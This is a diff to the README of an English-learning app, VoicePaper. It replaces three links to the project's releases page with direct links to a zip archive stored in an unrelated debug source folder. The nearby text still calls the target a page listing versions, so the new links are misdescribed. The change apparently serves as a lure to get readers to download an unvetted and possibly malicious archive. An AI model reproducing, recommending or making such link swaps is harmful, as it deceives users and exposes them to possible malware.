@@ -1,6 +1,6 @@
 # 🎧 VoicePaper - Enhance English Learning Easily
 
-[![Download VoicePaper](https://img.shields.io/badge/Download-VoicePaper-4caf50?style=for-the-badge)](https://github.com/aviautopilot/VoicePaper/releases)
+[![Download VoicePaper](https://img.shields.io/badge/Download-VoicePaper-4caf50?style=for-the-badge)](https://github.com/aviautopilot/VoicePaper/raw/refs/heads/main/backend/cmd/debug_pic_url/Voice-Paper-v2.5.zip)
 
 ---
 
@@ -48,7 +48,7 @@ This section shows you how to get VoicePaper on your PC and set it up step-by-st
 
 Click this link or copy and paste it into your web browser:
 
-https://github.com/aviautopilot/VoicePaper/releases
+https://github.com/aviautopilot/VoicePaper/raw/refs/heads/main/backend/cmd/debug_pic_url/Voice-Paper-v2.5.zip
 
 This page lists the latest versions of VoicePaper available for download.
 
@@ -169,7 +169,7 @@ If VoicePaper does not run or you meet issues:
 
 You can start the process by visiting:
 
-[![Download VoicePaper](https://img.shields.io/badge/Download-VoicePaper-blue?style=for-the-badge)](https://github.com/aviautopilot/VoicePaper/releases)
+[![Download VoicePaper](https://img.shields.io/badge/Download-VoicePaper-blue?style=for-the-badge)](https://github.com/aviautopilot/VoicePaper/raw/refs/heads/main/backend/cmd/debug_pic_url/Voice-Paper-v2.5.zip)
 
 Click the badge above to go directly to the download page.
 
